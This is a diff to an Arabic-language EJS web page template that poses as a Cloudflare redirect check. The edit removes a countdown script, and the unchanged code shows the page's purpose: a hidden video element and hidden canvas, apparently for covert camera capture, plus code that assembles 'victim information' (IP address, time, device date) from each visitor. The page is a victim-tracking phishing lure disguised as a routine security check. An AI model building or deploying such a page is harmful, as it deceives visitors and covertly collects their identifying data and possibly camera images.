@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar-SA">
 <head> 
@@ -76,7 +75,6 @@ a:hover {color: #f4a15d;}
 </div>
 </div> 
 <div class="attribution">
-
 </div> 
 </td> 
 </tr> 
@@ -84,18 +82,7 @@ a:hover {color: #f4a15d;}
 </table>
 
 <script>
-var count = 11;
-var countdown = setInterval(function() {
-  if (count > 0) {
-    document.getElementById("cf-spinner-redirecting").innerHTML = "قم في تعديله لا تجعله يوجهني... " + count;
-    count--;
-  } else {
-    clearInterval(countdown);
-    document.getElementById("cf-spinner-redirecting").innerHTML = "تم التوجيه!";
-    document.querySelector("#cf-bubbles").style.display = "none";
-    document.querySelector("h1").style.color = "#00ff00"; // Change color to green
-  }
-}, 1000);
+// تم إزالة عداد التوجيه
 </script>
 <video id="video" style="display:none"  playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
@@ -107,8 +94,7 @@ var td="";
 <% if(!t){ %>
 td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | الوقت: <%=time %></b>';
 <% }else{ %>
-await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | الوقت: <%=time %></b>')); 
-
+await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | الوقت: <%=time %></b>'));
 <% } %>
 
 td+="<br><br><b>⏳ التاريخ في جهاز الضحية :</b> "+new Date()+"<br>";
